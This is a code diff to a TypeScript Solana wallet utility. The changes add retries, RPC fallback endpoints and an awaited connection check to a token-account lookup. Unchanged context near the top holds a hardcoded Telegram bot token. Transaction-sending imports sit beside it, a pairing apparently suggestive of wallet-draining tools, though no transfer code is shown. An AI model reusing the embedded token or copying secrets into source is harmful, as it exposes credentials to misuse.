@@ -1,3 +1,4 @@
+
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
@@ -9,7 +10,7 @@ const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 // Retry function with exponential backoff
 async function retry<T>(
   fn: () => Promise<T>,
-  retries = 3,
+  retries = 5,
   initialDelay = 1000
 ): Promise<T> {
   let lastError;
@@ -27,47 +28,52 @@ async function retry<T>(
   throw lastError;
 }
 
+const testConnection = async (connection: Connection): Promise<boolean> => {
+  try {
+    await connection.getSlot();
+    return true;
+  } catch (error) {
+    console.error('Connection test failed:', error);
+    return false;
+  }
+};
+
 // Create a connection with proper config
-const createConnection = () => {
+const createConnection = async () => {
   const rpcEndpoints = [
     "https://api.mainnet-beta.solana.com",
     "https://solana-api.projectserum.com",
-    "https://rpc.ankr.com/solana"
+    "https://rpc.ankr.com/solana",
+    "https://solana.api.rpcpool.com"
   ];
   
-  let lastError;
+  const connectionConfig = {
+    commitment: 'confirmed' as const,
+    confirmTransactionInitialTimeout: 120000,
+    disableRetryOnRateLimit: false,
+    wsEndpoint: undefined as string | undefined,
+  };
   
-  // Try endpoints until one works
   for (const endpoint of rpcEndpoints) {
     try {
       const connection = new Connection(endpoint, {
-        commitment: 'confirmed',
-        confirmTransactionInitialTimeout: 60000,
+        ...connectionConfig,
         wsEndpoint: endpoint.replace('https', 'wss'),
       });
       
-      // Test the connection
-      const testConnection = async () => {
-        try {
-          await connection.getVersion();
-          return true;
-        } catch {
-          return false;
-        }
-      };
-      
-      if (testConnection()) {
+      const isValid = await testConnection(connection);
+      if (isValid) {
         console.log(`Connected successfully to ${endpoint}`);
         return connection;
       }
     } catch (error) {
       console.error(`Failed to connect to ${endpoint}:`, error);
-      lastError = error;
       continue;
     }
   }
   
-  console.error('All RPC endpoints failed, using fallback');
+  // Fallback connection with basic config
+  console.error('All RPC endpoints failed, using fallback with basic config');
   return new Connection("https://api.mainnet-beta.solana.com", {
     commitment: 'confirmed',
     confirmTransactionInitialTimeout: 60000,
@@ -81,14 +87,15 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
     const pubKey = new PublicKey(walletAddress);
     
     const response = await retry(async () => {
-      return await connection.getParsedTokenAccountsByOwner(
+      const conn = await createConnection();
+      return await conn.getParsedTokenAccountsByOwner(
         pubKey,
         {
           programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
         },
         'confirmed'
       );
-    });
+    }, 5);
 
     console.log("Token accounts response:", response);
 
